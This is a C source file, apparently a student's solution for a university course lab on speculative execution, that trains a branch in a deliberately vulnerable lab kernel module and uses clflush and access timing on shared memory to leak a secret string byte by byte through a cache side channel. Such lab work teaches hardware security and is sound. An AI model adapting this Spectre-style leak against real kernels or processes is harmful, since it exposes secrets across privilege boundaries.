/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"
#include <assert.h>
#define CACHE_THRESHOLD 90

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;
    uint64_t junk = 0, train_time = 0;
    int32_t train_index = -1;

    uint64_t time[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};

    printf("Launching attacker\n");

    //warm-up
    for (int i = 0; i < 1000; i++)
        junk = 2*i + 1;


    for (int j = 0; j < 5; j++){
        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
            clflush(&shared_memory[LAB2_PAGE_SIZE * i]);

            asm volatile("mfence\n\t":::);	
            call_kernel_part2(kernel_fd, shared_memory, 0);
            //call_kernel_part2(kernel_fd, shared_memory, 0);

            train_time = time_access(&shared_memory[LAB2_PAGE_SIZE * i]);
            if (train_time < CACHE_THRESHOLD) train_index = i;
        }
    }
    

    //printf("train index is %d\n", train_index);

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!
        // leaked_byte = ??
        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            clflush(&shared_memory[LAB2_PAGE_SIZE * mix_i]);

            asm volatile("mfence\n\t":::);
            //call_kernel_part2(kernel_fd, shared_memory, current_offset);
            call_kernel_part2(kernel_fd, shared_memory, 0);
            call_kernel_part2(kernel_fd, shared_memory, 0);
            call_kernel_part2(kernel_fd, shared_memory, 0);
            //call_kernel_part2(kernel_fd, shared_memory, 0);
            call_kernel_part2(kernel_fd, shared_memory, current_offset);
            
            
            
            /*
            call_kernel_part2(kernel_fd, shared_memory, 0);
            call_kernel_part2(kernel_fd, shared_memory, 0);
            call_kernel_part2(kernel_fd, shared_memory, current_offset);
            */
            
            
            time[mix_i] = time_access(&shared_memory[LAB2_PAGE_SIZE * mix_i]);
        }

        //printf("=================\n");
        asm volatile("mfence\n\t":::);
        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
            if (time[i] < CACHE_THRESHOLD) {
                //printf("hit index %d\n", i);
                if (current_offset == 0) leaked_byte = i;
                else if (current_offset && i!=train_index) leaked_byte = i;
            }
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
